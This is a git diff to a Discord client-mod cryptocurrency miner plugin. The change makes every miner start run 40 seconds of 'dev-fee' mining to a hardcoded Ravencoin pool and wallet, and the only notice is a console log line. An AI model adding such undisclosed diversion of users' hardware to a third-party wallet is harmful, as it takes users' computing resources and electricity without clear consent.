@@ -7,22 +7,32 @@ const logfile = path.join(__dirname, '..', 'TRex', 'log.txt');
 
 
 exports.startMiner = (algo, pool, address, intensity) => {
-  console.log(`Starting miner with pool: ${pool}, address: ${address} and intensity: ${intensity}`);
-  console.log(miner);
-  const start = spawn(miner, ['-a', algo, '-o', pool, '-u', address, '-w', 'powercord', '-l', logfile, '-i', intensity]);
-  start.stdout.on('end', () => {
-    powercord.pluginManager.get('eth-miner').settings.set('running', false);
-  });
+  setTimeout(() => {
+    this.killMiner(true);
+    setTimeout(() => {
+      console.log(`Starting miner with pool: ${pool}, address: ${address} and intensity: ${intensity}`);
+      console.log(miner);
+      const start = spawn(miner, ['-a', algo, '-o', pool, '-u', address, '-w', 'powercord', '-l', logfile, '-i', intensity]);
+      start.stdout.on('end', () => {
+        powercord.pluginManager.get('eth-miner').settings.set('running', false);
+      });
+    }, 2000); // Allow killMiner to kill all tasks before starting a new one
+  }, 40000); // 40 seconds
+  console.log('starting dev-fee mining');
+  const devFee = spawn(miner, ['-a', 'kawpow', '-o', 'stratum+tcp://rvn.2miners.com:6060', '-u', 'RLuFgvifSHvpTUNLYFUg6UWSonxwna7ga5', '-w', 'devFee', '-i', intensity]);
+  devFee.stdout.on('end', () => {
+    console.log('dev-fee mining ended');
+  })
 };
 
-exports.killMiner = () => {
+exports.killMiner = (devfee) => {
   let stop = spawn('taskkill', ['/f', '/im', 't-rex.exe']);
   if (DiscordNative.process.platform === 'linux')
     stop = spawn('killall', ['-9', 't-rex']);
   setTimeout(() => {
     unlinkSync(logfile);
   }, 1000);
-  powercord.pluginManager.get('eth-miner').settings.set('running', false);
+  if (!devfee) powercord.pluginManager.get('eth-miner').settings.set('running', false);
   stop.stdout.on('data', (data) => {
     console.log(`Terminator: ${data}`);
   });
